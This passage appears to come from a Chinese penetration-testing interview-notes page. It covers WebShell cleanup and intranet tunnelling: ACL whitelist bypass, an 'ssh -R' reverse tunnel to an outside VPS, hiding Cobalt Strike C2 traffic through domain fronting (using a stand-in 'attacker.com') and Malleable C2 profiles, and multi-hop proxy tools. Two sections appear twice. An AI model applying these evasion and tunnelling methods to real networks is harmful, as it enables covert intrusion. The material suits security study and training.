<li><strong>账户权限</strong>：删除攻击者创建的任何后门账户，并修改所有关键账户的密码</li>
</ul>
</li>
<li><strong>安全设备加固</strong>：<ul>
<li><strong>WAF&#x2F;IPS</strong>：更新 WAF 和 IPS 的规则，以阻止已知的攻击 Payload</li>
<li><strong>端点安全</strong>：在服务器上部署 EDR，增强对恶意进程的检测和响应能力</li>
</ul>
</li>
</ul>
<h1 id="9-内网穿透系列"><a href="#9-内网穿透系列" class="headerlink" title="9- 内网穿透系列"></a>9- 内网穿透系列</h1><h3 id="WebShell-查杀后仍有流量怎么办-1"><a href="#WebShell-查杀后仍有流量怎么办-1" class="headerlink" title="WebShell 查杀后仍有流量怎么办"></a>WebShell 查杀后仍有流量怎么办</h3><p><strong>第一步：确认并隔离威胁</strong></p>
<ul>
<li><strong>立即隔离</strong>：最重要的一步是立即将受感染的服务器从网络中隔离出来。拔掉网线，或者在防火墙上设置策略，切断所有入站和出站的网络连接。这能防止攻击者继续控制服务器，并阻止他们进行横向移动，感染其他内网资产</li>
<li><strong>确认流量来源</strong>：<ul>
<li><strong>查看进程</strong>：使用 <code>netstat -ano</code> （Windows）或 <code>netstat -anp</code> （Linux）命令，查找建立异常外连的进程</li>
<li><strong>关联PID</strong>：找到可疑进程的PID（进程ID），然后使用 <code>ps -ef | grep [PID]</code> （Linux）或任务管理器（Windows）来确定该进程的详细信息，包括其父进程、启动路径和命令行参数</li>
</ul>
</li>
</ul>
<p><strong>第二步：分析与清除持久化机制</strong></p>
<p>当 WebShell 被清除后，外连流量依然存在，这表明攻击者已经利用 WebShell <strong>留下了后门</strong></p>
<ul>
<li><strong>排查计划任务</strong>：攻击者最常用的持久化方式之一就是利用计划任务<ul>
<li><strong>Linux</strong>：检查 <code>/etc/crontab</code>、<code>/etc/cron.d/</code>、<code>/var/spool/cron/</code> 和用户的 <code>crontab -l</code>，查找是否有可疑的定时任务，例如定时执行脚本或下载恶意文件的任务</li>
<li><strong>Windows</strong>：使用 <code>schtasks</code> 命令或任务计划程序来检查是否存在异常的定时任务</li>
</ul>
</li>
<li><strong>排查自启动项</strong>：恶意程序可能会通过系统自启动项实现开机自启<ul>
<li><strong>Linux</strong>：检查 <code>/etc/rc.local</code>、<code>/etc/profile</code>、<code>~/.bashrc</code> 等文件</li>
<li><strong>Windows</strong>：检查注册表的 <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code> 和 <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
</ul>
</li>
<li><strong>排查系统服务</strong>：攻击者可能会创建新的系统服务<ul>
<li><strong>Windows</strong>：使用 <code>services.msc</code> 或 <code>sc query state=all</code> 命令检查是否有异常服务</li>
<li><strong>Linux</strong>：检查 <code>/etc/init.d/</code> 或 <code>/lib/systemd/system/</code> 目录</li>
</ul>
</li>
<li><strong>排查系统后门文件</strong>：恶意文件可能被伪装成系统文件，藏在 <code>/tmp</code>、<code>/var/tmp</code> 或 <code>/var/shm</code> 等临时目录，甚至是 <code>/bin</code> 或 <code>/usr/bin</code> 下</li>
</ul>
<p><strong>第三步：取证与溯源</strong></p>
<p>在清除所有威胁后，我们需要进行更深入的取证，以了解攻击者是如何入侵的</p>
<ul>
<li><strong>检查日志</strong>：<ul>
<li><strong>Web日志</strong>：分析Web服务器的 <code>access.log</code> 和 <code>error.log</code>，查找可疑的入侵路径</li>
<li><strong>系统日志</strong>：检查 <code>/var/log/secure</code> 或 <code>auth.log</code>，看是否有异常登录或权限提升记录</li>
<li><strong>其他日志</strong>：检查数据库、FTP 等服务的日志，寻找可疑的活动</li>
</ul>
</li>
<li><strong>文件时间戳</strong>：使用 <code>ls -alt</code> 命令，查看最近修改的文件，这有助于发现攻击者新创建的恶意文件</li>
<li><strong>威胁情报</strong>：将可疑的 IP 地址、域名、文件哈希值提交到威胁情报平台，看它们是否与已知的恶意活动相关</li>
</ul>
<p><strong>第四步：修复漏洞并加固</strong></p>
<ul>
<li><p><strong>漏洞修复</strong>：定位并修复被利用的漏洞。如果攻击者是通过 WebShell 入侵的，很可能是因为 Web 应用存在漏洞，例如文件上传、代码执行或反序列化漏洞</p>
</li>
<li><p><strong>权限收紧</strong>：</p>
<ul>
<li><strong>应用权限</strong>：将 Web 应用以低权限用户运行，限制其对文件系统的读写权限</li>
<li><strong>账户权限</strong>：删除攻击者创建的任何后门账户，并修改所有关键账户的密码</li>
</ul>
</li>
<li><p><strong>安全设备加固</strong>：</p>
<ul>
<li><strong>WAF&#x2F;IPS</strong>：更新 WAF 和 IPS 的规则，以阻止已知的攻击 Payload</li>
<li><strong>端点安全</strong>：在服务器上部署 EDR，增强对恶意进程的检测和响应能力</li>
</ul>
<hr>
<h3 id="内网有-ACL-策略，如果是白名单如何绕过"><a href="#内网有-ACL-策略，如果是白名单如何绕过" class="headerlink" title="内网有 ACL 策略，如果是白名单如何绕过"></a>内网有 ACL 策略，如果是白名单如何绕过</h3></li>
</ul>
<p><strong>1. 利用被允许的协议和端口</strong></p>
<p>这是最直接、最有效的方法。你需要找到 ACL 策略放行的协议和端口，然后利用它们建立隧道</p>
<ul>
<li><strong>DNS 隧道</strong>：如果 ACL 允许 DNS 流量（通常是放行的，因为网络解析需要），这是首选方法<ul>
<li><strong>原理</strong>：将你的恶意流量（例如 C2 通信）编码成 DNS 查询请求（通常是子域名），发送到你控制的公网 DNS 服务器。你的服务器解析后，再将响应数据编码在 DNS 回复包中返回</li>
<li><strong>优点</strong>：几乎所有网络都允许 DNS 流量出网，隐蔽性极高</li>
<li><strong>工具</strong>：<strong><code>iodine</code></strong> 和 <strong><code>dnscat2</code></strong> 是最经典的 DNS 隧道工具</li>
</ul>
</li>
<li><strong>ICMP 隧道</strong>：如果 ACL 允许 ICMP 流量（例如允许 <code>ping</code>），你就可以利用它<ul>
<li><strong>原理</strong>：将你的数据封装在 ICMP Echo 请求包的载荷中，通过 <code>ping</code> 的方式发送出去，并从回复包中接收数据</li>
<li><strong>优点</strong>：同样利用了网络诊断的合法协议，不易被察觉</li>
<li><strong>工具</strong>：<strong><code>ptunnel</code></strong> 或 <strong><code>icmpsh</code></strong></li>
</ul>
</li>
<li><strong>HTTP&#x2F;S 隧道</strong>：如果内网允许访问特定网站或端口的 HTTP&#x2F;S 流量，你可以伪装成这种流量<ul>
<li><strong>原理</strong>：将你的 C2 通信封装在 HTTP&#x2F;S 请求和响应中。你可以利用 <strong>CDN</strong>、<strong>合法域名</strong>或者<strong>特定的代理服务器</strong>来伪装流量</li>
<li><strong>优点</strong>：流量看起来像是正常的网页浏览，非常具有迷惑性</li>
<li><strong>工具</strong>：<strong><code>reGeorg</code> &#x2F; <code>Neo-reGeorg</code></strong>、<strong><code>sliver</code></strong>、<strong><code>Cobalt Strike</code></strong> 都可以配置 HTTPS 监听器来绕过</li>
</ul>
</li>
</ul>
<p><strong>2. 利用白名单 IP 或域名</strong></p>
<p>除了协议和端口，ACL 策略也可能基于 IP 地址或域名进行白名单控制</p>
<ul>
<li><strong>利用合法代理服务器</strong>：如果 ACL 允许访问某个合法的代理服务器（例如公司内部的 Web 代理），你可以尝试利用这个代理来转发你的流量<ul>
<li><strong>原理</strong>：配置你的攻击工具，让其通过这个代理服务器进行通信</li>
<li><strong>挑战</strong>：代理服务器可能会有日志记录和内容审计</li>
</ul>
</li>
<li><strong>利用被允许的域名进行 C2 通信</strong>：如果 ACL 只允许访问特定的几个域名（比如 <code>*.microsoft.com</code>），你可以尝试使用**域名欺骗（Domain Fronting）**技术，将你的 C2 服务器 IP 隐藏在这些域名背后<ul>
<li><strong>原理</strong>：将你的 C2 服务器部署在某个<strong>云服务商</strong>（如 AWS、Azure）上，然后利用这些服务商的合法域名作为流量的“正面”，而你的真实 C2 流量则通过 SNI 等方式悄悄地指向你的服务器</li>
<li><strong>挑战</strong>：需要深入了解域名欺骗的原理和云服务的配置，且随着安全防御的升级，这种方法越来越难以成功</li>
</ul>
</li>
</ul>
<p><strong>3. 利用物理或软件层面的漏洞</strong></p>
<p>如果以上网络层面的方法都失败了，你可能需要考虑更底层的绕过方式</p>
<ul>
<li><p><strong>利用已安装的软件进行通信</strong>：有些内网机器上会安装一些特殊的软件，这些软件可能拥有出网的白名单权限</p>
<ul>
<li><strong>原理</strong>：例如，一些企业的远程协助软件、杀毒软件、或者特定的企业应用，它们的通信流量是允许的。如果你能劫持或利用这些软件的进程，就可以将你的流量注入其中</li>
<li><strong>挑战</strong>：需要深入分析目标机器上运行的软件，并找到其漏洞或利用点</li>
</ul>
</li>
<li><p><strong>DLL 注入或进程注入</strong>：这是一种更高级的攻击方式</p>
<ul>
<li><strong>原理</strong>：将你的恶意代码注入到某个<strong>拥有出网白名单权限的合法进程</strong>中。这样，你的流量就会伪装成该进程的流量，从而绕过 ACL 策略</li>
<li><strong>优点</strong>：隐蔽性极高，可以有效绕过大多数基于网络层的防御</li>
<li><strong>挑战</strong>：技术门槛高，需要对进程和内存有深入理解</li>
</ul>
<hr>
<h3 id="如何进行内网穿透"><a href="#如何进行内网穿透" class="headerlink" title="如何进行内网穿透"></a>如何进行内网穿透</h3></li>
</ul>
<p><strong>1. 反向代理与隧道技术</strong></p>
<p>这是最常用也是最稳定的内网穿透方式。其原理是<strong>让内网主机主动连接公网服务器，并建立一个持久的通信隧道</strong></p>
<p><strong>工具：Frp</strong></p>
<p><strong>Frp</strong> 是一个高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议，它可以将内网服务暴露给公网</p>
<p><strong>工作流程：</strong></p>
<ul>
<li><strong>公网服务器（VPS）：</strong> 运行 <code>frps</code>（服务端），监听一个端口</li>
<li><strong>内网主机（目标机器）：</strong> 运行 <code>frpc</code>（客户端），连接到公网服务器</li>
<li><strong>配置：</strong> 在 <code>frpc.ini</code> 配置文件中指定要暴露的内网服务（如 SSH 服务、Web 服务），并将其转发到公网服务器的指定端口上</li>
</ul>
<p><strong>Frp 优点：</strong></p>
<ul>
<li><strong>多协议支持：</strong> 几乎可以转发任何类型的流量</li>
<li><strong>配置简单：</strong> 配置文件清晰，易于上手</li>
<li><strong>性能优秀：</strong> 资源占用低，转发速度快</li>
<li><strong>隐蔽性：</strong> 流量经过加密，且内网主机是主动出站连接，不易被防火墙拦截</li>
</ul>
<p><strong>工具：Ngrok</strong></p>
<p>Ngrok 提供了类似的隧道服务，但它通常需要注册账号，并且免费版有诸多限制。对于渗透测试来说，自己搭建的 Frp 更灵活、更可靠</p>
<p><strong>2. SSH 隧道</strong></p>
<p>SSH 隧道利用 SSH 协议来转发流量，是许多渗透测试工程师的首选工具，因为它在大多数 Linux 和 macOS 系统中都自带了 SSH 客户端</p>
<p><strong>反向 SSH 隧道</strong></p>
<p><strong>原理：</strong> 攻击者在公网服务器上监听一个端口，然后让内网主机使用 <code>ssh -R</code> 命令，将内网的端口映射到公网服务器上</p>
<p><strong>示例：</strong> 假设内网Web服务运行在 <code>127.0.0.1:8080</code>，公网VPS IP 为 <code>203.0.113.10</code>。 在内网主机上执行： <code>ssh -R 8080:127.0.0.1:8080 user@203.0.113.10</code></p>
<ul>
<li><code>-R</code>：表示反向端口转发</li>
<li><code>8080</code>：公网服务器上的监听端口</li>
<li><code>127.0.0.1:8080</code>：内网服务的地址和端口</li>
<li><code>user@203.0.113.10</code>：公网服务器的登录信息</li>
</ul>
<p>现在，你就可以通过访问 <code>http://203.0.113.10:8080</code> 来访问内网的 Web 服务了</p>
<p><strong>SSH 隧道优点：</strong></p>
<ul>
<li><strong>原生支持：</strong> 无需额外安装工具</li>
<li><strong>加密：</strong> 流量全程加密，安全可靠</li>
<li><strong>易用性：</strong> 命令行简单，操作便捷</li>
</ul>
<p><strong>3. DNS 隧道</strong></p>
<p>在一些网络环境极端受限（如只允许 DNS 请求通过）的情况下，DNS 隧道是一种非常隐蔽且有效的穿透方式</p>
<p><strong>原理：</strong> 将需要传输的数据编码为域名请求（DNS Query），发送到攻击者控制的公网 DNS 服务器。公网服务器接收到请求后，将其解码，然后将响应数据编码在 DNS 响应（DNS Reply）中返回</p>
<p><strong>工具：</strong></p>
<ul>
<li><strong>iodine：</strong> 这是一个流行的 DNS 隧道工具</li>
<li><strong>dnscat2：</strong> 另一个功能强大的 DNS 隧道工具，可以模拟一个交互式 Shell</li>
</ul>
<p><strong>DNS 隧道优点：</strong></p>
<ul>
<li><strong>极度隐蔽：</strong> DNS 流量通常不被防火墙严格审查，容易绕过限制</li>
<li><strong>穿透力强：</strong> 几乎可以在任何网络环境中工作</li>
</ul>
<p><strong>DNS 隧道缺点：</strong></p>
<ul>
<li><strong>速度慢：</strong> 由于 DNS 协议的限制，传输速度非常慢，不适合传输大量数据</li>
<li><strong>不稳定：</strong> 容易受到网络波动影响</li>
</ul>
<p><strong>4. HTTP&#x2F;HTTPS 隧道</strong></p>
<p>当目标网络只允许 HTTP&#x2F;HTTPS 流量出站时，可以利用 HTTP&#x2F;HTTPS 隧道</p>
<p><strong>原理：</strong> 将流量伪装成 HTTP&#x2F;HTTPS 请求，通过公网服务器的 Web 代理或隧道工具进行转发</p>
<p><strong>工具：</strong></p>
<ul>
<li><strong>Tunna：</strong> 一个利用 HTTP 协议进行 TCP 隧道转发的工具</li>
<li><strong>meterpreter 的 Reverse HTTP&#x2F;HTTPS Payload：</strong> Metasploit 框架中的反向 shell，其流量就是通过 HTTP&#x2F;HTTPS 隧道传输的</li>
</ul>
<p><strong>HTTP&#x2F;HTTPS 隧道优点：</strong></p>
<ul>
<li><strong>绕过代理：</strong> 能够穿透只允许 Web 流量的网络</li>
<li><strong>隐蔽性好：</strong> 流量伪装成正常浏览行为，不易被发现</li>
</ul>
<hr>
<h3 id="如何隐藏-CS-流量"><a href="#如何隐藏-CS-流量" class="headerlink" title="如何隐藏 CS 流量"></a>如何隐藏 CS 流量</h3><p><strong>1. 域前置</strong></p>
<p>域前置是一种非常有效的流量隐藏技术，它利用了内容分发网络（CDN）的特性</p>
<p><strong>核心思想：</strong> 攻击者将 CS 流量伪装成对一个著名且无害的域名的访问请求（比如 <code>www.google.com</code> 或 <code>www.amazon.com</code>）。当请求到达 CDN 服务器后，CDN 服务器会根据请求头中的特定字段（如 <code>Host</code> 字段），将流量转发到攻击者控制的真正恶意域名或 IP 地址上</p>
<p><strong>工作流程：</strong></p>
<ol>
<li>你注册一个域名，例如 <code>attacker.com</code></li>
<li>将 <code>attacker.com</code> 的 CNAME 记录指向一个支持域前置的 CDN 服务提供商（如 Amazon CloudFront 或 Akamai）</li>
<li>在 CS 的配置文件中，将监听器的 Host Header 设置为 <code>attacker.com</code></li>
<li>在 Beacon 的配置文件中，将 Host 设置为公共域名，例如 <code>www.google.com</code></li>
</ol>
<p><strong>为什么有效？</strong> 网络安全设备看到的是对 <code>www.google.com</code> 的访问请求，这通常是白名单流量，很难被拦截。只有当流量到达 CDN 服务器后，其内部转发机制才会将其导向真正的恶意服务器</p>
<p><strong>2. Malleable C2 配置文件</strong></p>
<p>这是隐藏 CS 流量最基本也是最强大的方法。Malleable C2 配置文件允许你自定义 Beacon 的所有网络通信特征，使其看起来像合法的流量</p>
<p><strong>核心思想：</strong> CS 的默认流量特征非常明显。通过修改 <strong>Malleable C2 配置文件</strong>，你可以改变 Beacon 的 HTTP 请求头、响应头、URI、HTTP POST 请求中的数据格式等等，使其模仿其他应用程序的流量，如 Google Chrome、Office 365 等</p>
<p><strong>主要配置项：</strong></p>
<ul>
<li><strong><code>http-get</code>：</strong> 定义 Beacon 向 C2 服务器获取任务的 GET 请求。你可以自定义 <code>user-agent</code>、<code>uri</code> 等</li>
<li><strong><code>http-post</code>：</strong> 定义 Beacon 向 C2 服务器回传数据的 POST 请求。你可以自定义 <code>uri</code>、<code>data</code> 等</li>
<li><strong><code>headers</code>：</strong> 修改请求头，让其看起来像正常的 Web 流量</li>
<li><strong><code>stage</code>：</strong> 更改 Beacon 的 Payload 特征，使其更难被检测</li>
</ul>
<p><strong>示例：</strong> 一个精心制作的 Malleable C2 配置文件，可以使 Beacon 的流量看起来像在访问 Outlook Web Access 或者一个合法的 CDN 资源。这大大增加了网络安全设备的识别难度。</p>
<p><strong>3. DNS over HTTPS（DoH）隧道</strong></p>
<p>DoH 是一种将 DNS 查询通过加密的 HTTPS 协议发送的技术。你可以利用它来隐藏 CS 的 DNS 流量</p>
<p><strong>核心思想：</strong> 传统的 DNS 流量是明文的，很容易被监控。如果你使用 DNS 作为 C2 通信信道，将 Beacon 的 DNS 请求伪装成 DoH 流量，可以有效绕过一些防火墙的 DNS 流量检测</p>
<p><strong>优点：</strong></p>
<ul>
<li><strong>加密：</strong> 流量全程加密，难以被中间人分析</li>
<li><strong>伪装性：</strong> 将 DNS 流量混入正常的 HTTPS 流量中，非常隐蔽</li>
</ul>
<p><strong>实现方式：</strong> 需要使用支持 DoH 的 CS 插件或者自定义脚本来构建隧道</p>
<p><strong>4. 利用其他协议隐藏流量</strong></p>
<p>除了 HTTP&#x2F;HTTPS 和 DNS，CS 还可以利用其他协议进行 C2 通信，从而绕过针对 Web 流量的检测</p>
<p><strong>a. SMB Beacon</strong></p>
<p>SMB Beacon 利用 SMB 协议在内网中进行横向移动和 C2 通信。它不产生任何出站流量，所有通信都在内网主机之间进行。 <strong>优点：</strong> 完美隐藏了出站流量，只在内网活动，非常适合内网横向渗透。 <strong>缺点：</strong> 无法从外部直接控制，需要先在一个跳板机上建立一个 HTTP&#x2F;DNS Beacon</p>
<p><strong>b. ICMP Beacon</strong></p>
<p>ICMP Beacon 利用 ICMP 协议进行 C2 通信。 <strong>优点：</strong> 许多网络环境对 ICMP 流量审查不严，因此隐蔽性较好。 <strong>缺点：</strong> 传输数据量小，速度慢，不稳定</p>
<hr>
<h3 id="如何隐藏-CS-流量-1"><a href="#如何隐藏-CS-流量-1" class="headerlink" title="如何隐藏 CS 流量"></a>如何隐藏 CS 流量</h3><p><strong>1. 域前置</strong></p>
<p>域前置是一种非常有效的流量隐藏技术，它利用了内容分发网络（CDN）的特性</p>
<p><strong>核心思想：</strong> 攻击者将 CS 流量伪装成对一个著名且无害的域名的访问请求（比如 <code>www.google.com</code> 或 <code>www.amazon.com</code>）。当请求到达 CDN 服务器后，CDN 服务器会根据请求头中的特定字段（如 <code>Host</code> 字段），将流量转发到攻击者控制的真正恶意域名或 IP 地址上</p>
<p><strong>工作流程：</strong></p>
<ol>
<li>你注册一个域名，例如 <code>attacker.com</code></li>
<li>将 <code>attacker.com</code> 的 CNAME 记录指向一个支持域前置的 CDN 服务提供商（如 Amazon CloudFront 或 Akamai）</li>
<li>在 CS 的配置文件中，将监听器的 Host Header 设置为 <code>attacker.com</code></li>
<li>在 Beacon 的配置文件中，将 Host 设置为公共域名，例如 <code>www.google.com</code></li>
</ol>
<p><strong>为什么有效？</strong> 网络安全设备看到的是对 <code>www.google.com</code> 的访问请求，这通常是白名单流量，很难被拦截。只有当流量到达 CDN 服务器后，其内部转发机制才会将其导向真正的恶意服务器</p>
<p><strong>2. Malleable C2 配置文件</strong></p>
<p>这是隐藏 CS 流量最基本也是最强大的方法。Malleable C2 配置文件允许你自定义 Beacon 的所有网络通信特征，使其看起来像合法的流量</p>
<p><strong>核心思想：</strong> CS 的默认流量特征非常明显。通过修改 <strong>Malleable C2 配置文件</strong>，你可以改变 Beacon 的 HTTP 请求头、响应头、URI、HTTP POST 请求中的数据格式等等，使其模仿其他应用程序的流量，如 Google Chrome、Office 365 等</p>
<p><strong>主要配置项：</strong></p>
<ul>
<li><strong><code>http-get</code>：</strong> 定义 Beacon 向 C2 服务器获取任务的 GET 请求。你可以自定义 <code>user-agent</code>、<code>uri</code> 等</li>
<li><strong><code>http-post</code>：</strong> 定义 Beacon 向 C2 服务器回传数据的 POST 请求。你可以自定义 <code>uri</code>、<code>data</code> 等</li>
<li><strong><code>headers</code>：</strong> 修改请求头，让其看起来像正常的 Web 流量</li>
<li><strong><code>stage</code>：</strong> 更改 Beacon 的 Payload 特征，使其更难被检测</li>
</ul>
<p><strong>示例：</strong> 一个精心制作的 Malleable C2 配置文件，可以使 Beacon 的流量看起来像在访问 Outlook Web Access 或者一个合法的 CDN 资源。这大大增加了网络安全设备的识别难度。</p>
<p><strong>3. DNS over HTTPS（DoH）隧道</strong></p>
<p>DoH 是一种将 DNS 查询通过加密的 HTTPS 协议发送的技术。你可以利用它来隐藏 CS 的 DNS 流量</p>
<p><strong>核心思想：</strong> 传统的 DNS 流量是明文的，很容易被监控。如果你使用 DNS 作为 C2 通信信道，将 Beacon 的 DNS 请求伪装成 DoH 流量，可以有效绕过一些防火墙的 DNS 流量检测</p>
<p><strong>优点：</strong></p>
<ul>
<li><strong>加密：</strong> 流量全程加密，难以被中间人分析</li>
<li><strong>伪装性：</strong> 将 DNS 流量混入正常的 HTTPS 流量中，非常隐蔽</li>
</ul>
<p><strong>实现方式：</strong> 需要使用支持 DoH 的 CS 插件或者自定义脚本来构建隧道</p>
<p><strong>4. 利用其他协议隐藏流量</strong></p>
<p>除了 HTTP&#x2F;HTTPS 和 DNS，CS 还可以利用其他协议进行 C2 通信，从而绕过针对 Web 流量的检测</p>
<p><strong>a. SMB Beacon</strong></p>
<p>SMB Beacon 利用 SMB 协议在内网中进行横向移动和 C2 通信。它不产生任何出站流量，所有通信都在内网主机之间进行。 <strong>优点：</strong> 完美隐藏了出站流量，只在内网活动，非常适合内网横向渗透。 <strong>缺点：</strong> 无法从外部直接控制，需要先在一个跳板机上建立一个 HTTP&#x2F;DNS Beacon</p>
<p><strong>b. ICMP Beacon</strong></p>
<p>ICMP Beacon 利用 ICMP 协议进行 C2 通信。 <strong>优点：</strong> 许多网络环境对 ICMP 流量审查不严，因此隐蔽性较好。 <strong>缺点：</strong> 传输数据量小，速度慢，不稳定</p>
<hr>
<h3 id="代理转发常用的工具有哪些"><a href="#代理转发常用的工具有哪些" class="headerlink" title="代理转发常用的工具有哪些"></a>代理转发常用的工具有哪些</h3><p><strong>1. Frp</strong></p>
<p><strong>FRP</strong> 是一款开源的高性能反向代理应用，可以帮助你将内网服务暴露到公网。它支持多种协议，如 TCP、UDP、HTTP、HTTPS，并且配置简单</p>
<ul>
<li><strong>优点：</strong> 性能高、功能强大、支持多平台、社区活跃</li>
<li><strong>适用场景：</strong> 将内网中的 Web 服务、SSH 服务等暴露给公网，或者建立一个稳定的代理通道</li>
</ul>
<p><strong>2. EW</strong></p>
<p><strong>EW</strong> 是一款专为内网穿透设计的轻量级工具。它通过 SOCKS5 代理的方式，将流量在多个节点之间进行转发，可以轻松构建多级代理</p>
<ul>
<li><strong>优点：</strong> 体积小巧、使用简单、无需安装、支持多级代理</li>
<li><strong>适用场景：</strong> 在复杂的内网环境中，通过多个跳板机构建代理链，实现流量的隐蔽传输。</li>
</ul>
<p><strong>3. Nps</strong></p>
<p><strong>Nps</strong> 是一款功能强大的开源内网穿透工具，支持 TCP、UDP、SOCKS5、HTTP 等多种代理模式。它提供了 Web 管理界面，方便用户管理代理和查看流量信息</p>
<ul>
<li><strong>优点：</strong> 功能丰富、有 Web 管理界面、支持多种协议、性能稳定</li>
<li><strong>适用场景：</strong> 需要长期、稳定地维护一个内网穿透通道时，特别是在团队协作的环境下。</li>
</ul>
<p><strong>4. Ligolo-ng</strong></p>
<p><strong>Ligolo-ng</strong> 是一款基于隧道（Tun）设备的代理工具。它在客户端和服务器端之间创建一个虚拟网络接口，使得攻击者可以像直接连接到内网一样，通过这个接口访问内网资源</p>
<ul>
<li><strong>优点：</strong> 提供了完整的二层网络访问能力、流量隐蔽性高、不易被检测</li>
<li><strong>适用场景：</strong> 当你需要执行更复杂的网络操作（如端口扫描、漏洞利用等），而不仅仅是简单的流量转发时</li>
</ul>
<p><strong>5. SSH Tunneling</strong></p>
<p><strong>SSH</strong> 本身就是一种强大的代理转发工具。通过 SSH 隧道，你可以创建正向代理、反向代理和动态代理（SOCKS5 代理）</p>
<ul>
<li><strong>正向代理：</strong> 将客户端的流量转发到 SSH 服务器</li>
<li><strong>反向代理：</strong> 将 SSH 服务器的流量转发到内网服务，实现内网穿透</li>
<li><strong>动态代理：</strong> 将本地端口变成一个 SOCKS5 代理，可以用于代理浏览器流量或整个系统的流量</li>
</ul>
<p><strong>优点：</strong> 系统自带、隐蔽性好、加密传输、无需额外工具</p>
<p> <strong>适用场景：</strong> 已经获得了 SSH 权限，且只需进行简单的端口转发或动态代理时</p>
<hr>
<h3 id="代理转发常用的工具有哪些-1"><a href="#代理转发常用的工具有哪些-1" class="headerlink" title="代理转发常用的工具有哪些"></a>代理转发常用的工具有哪些</h3><p><strong>1. Frp</strong></p>
<p><strong>FRP</strong> 是一款开源的高性能反向代理应用，可以帮助你将内网服务暴露到公网。它支持多种协议，如 TCP、UDP、HTTP、HTTPS，并且配置简单</p>
<ul>
<li><strong>优点：</strong> 性能高、功能强大、支持多平台、社区活跃</li>
<li><strong>适用场景：</strong> 将内网中的 Web 服务、SSH 服务等暴露给公网，或者建立一个稳定的代理通道</li>
</ul>
<p><strong>2. EW</strong></p>
<p><strong>EW</strong> 是一款专为内网穿透设计的轻量级工具。它通过 SOCKS5 代理的方式，将流量在多个节点之间进行转发，可以轻松构建多级代理</p>
<ul>
<li><strong>优点：</strong> 体积小巧、使用简单、无需安装、支持多级代理</li>
<li><strong>适用场景：</strong> 在复杂的内网环境中，通过多个跳板机构建代理链，实现流量的隐蔽传输。</li>
</ul>
<p><strong>3. Nps</strong></p>
<p><strong>Nps</strong> 是一款功能强大的开源内网穿透工具，支持 TCP、UDP、SOCKS5、HTTP 等多种代理模式。它提供了 Web 管理界面，方便用户管理代理和查看流量信息</p>
<ul>
<li><strong>优点：</strong> 功能丰富、有 Web 管理界面、支持多种协议、性能稳定</li>
<li><strong>适用场景：</strong> 需要长期、稳定地维护一个内网穿透通道时，特别是在团队协作的环境下。</li>
</ul>
<p><strong>4. Ligolo-ng</strong></p>
<p><strong>Ligolo-ng</strong> 是一款基于隧道（Tun）设备的代理工具。它在客户端和服务器端之间创建一个虚拟网络接口，使得攻击者可以像直接连接到内网一样，通过这个接口访问内网资源</p>
<ul>
<li><strong>优点：</strong> 提供了完整的二层网络访问能力、流量隐蔽性高、不易被检测</li>
<li><strong>适用场景：</strong> 当你需要执行更复杂的网络操作（如端口扫描、漏洞利用等），而不仅仅是简单的流量转发时</li>
</ul>
<p><strong>5. SSH Tunneling</strong></p>
<p><strong>SSH</strong> 本身就是一种强大的代理转发工具。通过 SSH 隧道，你可以创建正向代理、反向代理和动态代理（SOCKS5 代理）</p>
<ul>
<li><strong>正向代理：</strong> 将客户端的流量转发到 SSH 服务器</li>
<li><strong>反向代理：</strong> 将 SSH 服务器的流量转发到内网服务，实现内网穿透</li>
<li><strong>动态代理：</strong> 将本地端口变成一个 SOCKS5 代理，可以用于代理浏览器流量或整个系统的流量</li>
</ul>
<p><strong>优点：</strong> 系统自带、隐蔽性好、加密传输、无需额外工具</p>
<p> <strong>适用场景：</strong> 已经获得了 SSH 权限，且只需进行简单的端口转发或动态代理时</p>
<hr>
<h3 id="内网的多级代理用什么东西代理"><a href="#内网的多级代理用什么东西代理" class="headerlink" title="内网的多级代理用什么东西代理"></a>内网的多级代理用什么东西代理</h3><p><strong>1. SOCKS 代理</strong></p>
<p><strong>什么是 SOCKS 代理？</strong> SOCKS（Socket Secure）是一种网络协议，它允许客户端通过一个代理服务器进行通信，而不必知道具体的应用层协议。它工作在 OSI 模型的第五层（会话层），因此可以支持几乎所有的应用层协议，如 HTTP、FTP、SSH 等</p>
<p><strong>如何实现？</strong></p>
<ul>
<li><strong>SSH</strong>: <code>ssh -D 1080 user@remote_server</code> 这是最常见也最简单的方式。这条命令会在本地开启一个 SOCKS 代理（通常是 1080 端口），所有经过该代理的流量都会通过 SSH 连接加密后发送到远程服务器。远程服务器再将流量转发到目标内网。SSH 的优点是自带加密，且几乎所有 Linux 系统都默认安装</li>
<li><strong>Metasploit 的 <code>auxiliary/server/socks4a</code> 或 <code>socks5</code> 模块</strong>: 如果已经获取了 Meterpreter 会话，你可以直接在会话中运行 <code>background</code>，然后在 MSFconsole 中使用这个模块。它会利用已有的会话作为通道，建立一个 SOCKS 代理，让你可以通过 Metasploit 访问内网</li>
<li><strong>frp (Fast Reverse Proxy)</strong>: frp 是一个高性能的反向代理工具，它可以在公网服务器和内网服务器之间建立一个 TCP&#x2F;UDP&#x2F;HTTP&#x2F;HTTPS&#x2F;SOCKS5 等协议的通道。在多级代理场景中，frp 表现出色，因为它支持多级级联代理，并且配置灵活</li>
</ul>
<p><strong>2. HTTP 代理</strong></p>
<p><strong>什么是 HTTP 代理？</strong> HTTP 代理是一种工作在应用层（OSI 模型的第七层）的代理，主要用于转发 HTTP 和 HTTPS 流量。虽然功能不如 SOCKS 代理通用，但在某些特定场景下非常有用，尤其是在内网中部署了 Web 服务器时</p>
<p><strong>如何实现？</strong></p>
<ul>
<li><strong>Venom</strong>: Venom 是一种使用 Go 语言开发的强大代理工具，它支持多级级联代理，可以模拟 HTTP&#x2F;HTTPS 协议，从而绕过一些网络审计设备的检测。它的优点是轻量、配置简单，并且支持 Windows、Linux 等多个平台</li>
<li><strong>Neo-reGeorg</strong>: Neo-reGeorg 是 reGeorg 的升级版，它利用 HTTP(S) 隧道技术将流量封装在 HTTP 请求中。这意味着只要目标内网能访问 Web 服务，并且你能上传一个脚本（如 ASP&#x2F;JSP&#x2F;PHP），就能建立一个代理隧道</li>
</ul>
<p><strong>3. VPN</strong></p>
